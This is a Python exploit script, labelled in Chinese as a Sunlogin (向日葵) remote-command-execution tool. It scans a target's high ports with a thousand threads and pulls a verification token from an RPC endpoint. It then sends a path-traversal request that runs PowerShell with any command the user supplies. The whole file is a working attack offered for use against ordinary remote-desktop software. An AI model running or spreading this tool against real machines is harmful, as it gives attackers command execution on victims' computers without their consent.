import socket
import requests
import json
import argparse
import queue
import threading


class Scan:
    def __init__(self, ip, cmd):
        self.flag = False
        self.ip = ip
        self.cmd = cmd
        self.port = 0
        self.token = ""

    def scan(self):
        self.scan_port()
        if self.port == 0:
            print("该主机没有发现漏洞。")
        else:
            self.run_cmd()

    def get_token(self, port):
        url = f"http://{self.ip}:{port}/cgi-bin/rpc?action=verify-haras"
        try:
            text = requests.get(url, verify=False, timeout=0.2).text
            data = json.loads(text)
            return data["verify_string"]
        except Exception as e:
            return None

    def scan_host(self, port_queue):
        if self.flag:
            return

        while not port_queue.empty():
            port = port_queue.get()
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.settimeout(0.5)

            try:
                res = server.connect_ex((ip, int(port)))
                server.settimeout(None)
                if res == 0:
                    token = self.get_token(port)
                    if token is not None:
                        print("发现可能存在RCE漏洞的端口 ", port)
                        self.port = port
                        self.token = token
                        break

            except Exception as e:
                print(e)
            finally:
                server.close()

    def scan_port(self):
        port_queue = queue.Queue()
        for i in range(40000, 65535):  # Windows10可能会出现10000以下端口，手动调节端口范围
            port_queue.put(str(i))
        threads = []
        for i in range(1000):
            t = threading.Thread(target=self.scan_host, args=[port_queue])
            threads.append(t)
        for i in threads:
            i.start()
        for i in threads:
            i.join()

    def run_cmd(self):
        print(f"正在执行 {self.cmd} 命令")
        url = f"http://{self.ip}:{self.port}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+{self.cmd}"
        try:
            res = requests.get(url=url, headers={"Cookie": f"CID={self.token}"}, timeout=5)
            if res.status_code == 200:
                print(f"RCE 结果: {res.text}")
                self.flag = True
        except Exception as e:
            print("run cmd failed", e)


if __name__ == '__main__':
    usage = ("Usage: python3 main.py -i [ip] -c [command] \n"
             'python main.py -i 127.0.0.1 -p 50010 -c whoami\n')
    parser = ar = argparse.ArgumentParser(description='向日葵 RCE')
    parser.add_argument("-i", type=str, dest="ip", help="scan ip")
    parser.add_argument("-c", type=str, dest="cmd", help="scan cmd")
    args = parser.parse_args()
    ip = args.ip
    cmd = args.cmd
    if ip is None:
        print(usage)
        exit(0)
    if cmd is None:
        cmd = "whoami"
    scan = Scan(ip, cmd)
    scan.scan()